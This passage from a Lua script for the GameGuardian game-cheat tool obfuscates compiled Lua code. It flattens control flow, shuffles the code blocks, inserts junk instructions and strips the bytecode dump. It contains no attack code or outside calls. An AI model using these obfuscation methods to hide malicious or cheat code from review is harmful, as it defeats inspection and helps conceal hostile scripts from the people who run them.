    local Pic = {"🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾️","🇲","🇹","🇾️","🇲","🇹","🇾","🇲","🇹","🇾️","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾","🇲","🇹","🇾"}
    local Star = 0
    local Resver
	function Resver()
	    Star = Star + 1
	    if Star > #Pic then
	        Star = 1
	    end
	    local Tab = {}
	    local b = gg.bytes(Pic[Star])
        local tab = {}
        for k,v in pairs(b) do
            table.insert(tab, 1, string.format("%x",v))
        end
        tab = table.concat(tab)
            tab = tab:gsub("........",function (x)
            table.insert(Tab, 1, "OP[48] 0x" .. x .. "\n")
        end,1)
        return "\n" .. table.concat(Tab)
    end
    if not free then
        Resver=function()
            return ""
        end
    end
    gg.toast("『正在添加防御——』")
    Tran = Tran:gsub("(; .local v[^\n]+)\n",function(x)
        return x
    end):gsub("\n%s*(; .end local v[^\n]+)",function(x)
        return x
    end)
    :gsub("\n%s+","\n")
    Tran = Tran:gsub("maxstacksize (%d+)(.-RETURN[^\nv]+)\n",function(max,str)
        if str:find("TFORCALL") == nil then
            local tre_S = {}
            local tre_C = {}
            local num = 1000000
            str = str:gsub("[^\n]+",function(s)
                zl = s:match("%S+")
                if zl == ".upval" or zl == ".line" then
                    tre_C[#tre_C+1] = s
                elseif zl == "RETURN" then
                    if s:find("v") then
                        tre_S[#tre_S+1] = ":goto_" .. num .. "\n" .. s .. "\n" .. "JMP :goto_" .. (num+1) .. Resver()
                        num = num+1
                    else
                        tre_S[#tre_S+1] = ":goto_" .. num .. "\n" .. s
                        num = num+1
                    end
                elseif zl:find("goto_") then
                    tre_S[#tre_S+1] = s .. "\n" .. "JMP :goto_" .. num .. Resver()
                elseif zl == "JMP" then
                    if tre_S[1] then
                        tre_S[#tre_S] = tre_S[#tre_S]:gsub("(.+)(JMP[^\n]+)",function(zz,o)
                            return zz .. s .. "\n" .. o
                    end)
                    else
                        tre_C[#tre_C+1] = s
                    end
                else
                    tre_S[#tre_S+1] = ":goto_" .. num .. "\n" .. s .. "\n" .. "JMP :goto_" .. (num+1) .. Resver()
                    num = num+1
                end
            end)
            tre_S = Tab.Table_Rand(tre_S)
            for i,k in pairs(tre_C) do
                table.insert(tre_S,i,k)
            end
            table.insert(tre_S,#tre_C+1,"JMP :goto_1000000")
            tre_S = table.concat(tre_S,"\n")
            return "maxstacksize "..math.random(190,230).."\n" .. tre_S:gsub("\n%s+","\n") .. "\n"
        else
            local tre_Z = {}
            local num = 1000000
            local tre_X = {}
            local tre_V = {}
            str = str:gsub("[^\n]+",function(s)
                zl = s:match("%S+")
                local Dt,tD,DT = nil, nil, nil
                if zl == ".upval" or zl == ".line" then
                    tre_Z[#tre_Z+1] = s
                    tD = true
                end

                if ZL[zl] then
                    num = num+1
                    if zl == "RETURN" and s:find("v") == nil then
                        tre_X[#tre_X+1] = ":goto_" .. num .. "\n" .. s
                        DT=true
                    else
                        tre_X[#tre_X+1] = ":goto_" .. num .. "\n" .. s .. "\n" .. "JMP :goto_" .. (num+1) .. Resver()
                        num = num+1
                        Dt = true
                    end
                end
                if Dt then
                    return "JMP :goto_" .. (num-1) .. "\n:goto_" .. num
                elseif tD then
                    return ""
                elseif DT then
                    return "JMP :goto_" .. num
                else
                    return s
                end
            end)
            tre_X = Tab.Table_Rand(tre_X)
            tre_V = Tab.Table_Rand(tre_V)
            tre_Z = table.concat(tre_Z,"\n")
            tre_X = table.concat(tre_X,"\n")
            tre_V = table.concat(tre_V,"\n")
            return "maxstacksize "..max.."\n" .. tre_Z .. "\nJMP :goto_1000000\n" .. tre_X .. "\n:goto_1000000\n" .. str .. "\n" .. tre_V .. "\n"
        end
    end)
    Tran = Tran:gsub("; .local v%d+%s*\"%(.-%)\"",function(x)
        return x .. "\n"
    end):gsub("; .end local v%d+%s*\"%(.-%)\"",function(x)
        return "\n" .. x
    end):gsub("\n%s+","\n")
    return Tran
end
gr=Disloc(gr,1)
File_operations(last,gr)
local rg=load(gr)
if not rg then
    os.exit(gg.alert("『加密失败』"))
end
gr=string.dump(rg,true)
File_operations(last,gr)
gg.setVisible(true)